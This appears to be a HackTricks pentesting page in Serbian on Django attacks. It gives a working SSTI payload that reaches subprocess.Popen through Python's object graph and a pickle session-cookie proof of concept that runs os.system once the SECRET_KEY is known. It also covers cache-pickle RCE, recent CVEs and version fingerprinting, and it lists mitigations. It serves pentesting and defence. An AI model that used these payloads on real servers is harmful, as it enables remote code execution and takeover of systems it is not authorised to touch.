# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Django-ov podrazumevani metod skladištenja cache-a su Python pickles, što može dovesti do RCE ako se untrusted input unpickle-uje. **Ako napadač dobije write pristup cache-u, može eskalirati ovu ranjivost do RCE na osnovnom serveru**.

Django cache se čuva na jednom od četiri mesta: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), ili u [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Cache koji se čuva na Redis serveru ili u bazi predstavlja najverovatnije vektore napada (Redis injection i SQL injection), ali napadač takođe može iskoristiti file-based cache da pretvori arbitrarno pisanje u RCE. Maintainers su ovo označili kao non-issue. Važno je napomenuti da će folder za cache fajlove, naziv SQL tabele i detalji Redis servera zavisiti od implementacije.

Ovaj HackerOne izveštaj daje sjajan, reproducibilan primer eksploatisanja Django cache-a koji se čuva u SQLite bazi: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
Django Template Language (DTL) je **Turing-complete**. Ako se podaci koje korisnik unese renderuju kao *template string* (na primer pozivanjem `Template(user_input).render()` ili kada `|safe`/`format_html()` ukloni auto-escaping), napadač može postići puni SSTI → RCE.

### Detekcija
1. Potražite dinamičke pozive `Template()` / `Engine.from_string()` / `render_to_string()` koji uključuju *bilo koje* ne-sanitizovane podatke iz request-a.
2. Pošaljite time-based ili aritmetički payload:
```django
{{7*7}}
```
Ako renderovani output sadrži `49` ulaz je kompajliran od strane template engine-a.

### Primitiv za RCE
Django blokira direktan pristup `__import__`, ali Python object graph je dostupan:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
Pronađite indeks `subprocess.Popen` (≈400–500 u zavisnosti od Python build-a) i izvršite proizvoljne komande:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Bezbedniji univerzalni gadget je ponavljati dok `cls.__name__ == 'Popen'`.

Isti gadget radi za **Debug Toolbar** ili **Django-CMS** funkcije za renderovanje template-a koje nepravilno obrađuju korisnički unos.

---

### Takođe vidi: ReportLab/xhtml2pdf PDF export RCE
Aplikacije izgrađene na Django-u često integrišu xhtml2pdf/ReportLab za izvoz view-ova kao PDF. Kada HTML pod kontrolom korisnika dospe u generisanje PDF-a, rl_safe_eval može evaluirati izraze unutar trostrukih zagrada `[[[ ... ]]]`, omogućavajući izvršavanje koda (CVE-2023-33733). Detalji, payloads i mitigacije:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
Ako je podešavanje `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` omogućeno (ili se koristi custom serializer koji deserializuje pickle), Django *decrypts and unpickles* the session cookie **pre nego što** pozove bilo koji view kod. Dakle, posedovanje validnog signing key-a (projekat `SECRET_KEY` po defaultu) je dovoljno za trenutni remote code execution.

### Exploit zahtevi
* Server koristi `PickleSerializer`.
* Napadač zna / može pogoditi `settings.SECRET_KEY` (leaks via GitHub, `.env`, error pages, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Pošaljite dobijeni cookie, i payload se izvršava sa privilegijama WSGI worker-a.

**Mitigations**: Zadržite podrazumevani `JSONSerializer`, rotirajte `SECRET_KEY`, i konfigurišite `SESSION_COOKIE_HTTPONLY`.

---

## Nedavni (2023-2025) Django CVE-ovi visokog uticaja koje Pentesters treba da provere
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (ispravljeno 4. jun 2025). Omogućava napadačima da ubace newlines/ANSI codes u log fajlove i zatrovaju downstream log analysis. Nivo patch-a ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). Kreirajte JSON ključeve koji prekinu navodnike i izvrše proizvoljni SQL. Ispravljeno u 4.2.15 / 5.0.8.

Uvek fingerprint-ujte tačnu verziju frameworka preko `X-Frame-Options` error page ili `/static/admin/css/base.css` hash-a i testirajte gore navedeno gde je primenljivo.

---

## References
* Django bezbednosno izdanje – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
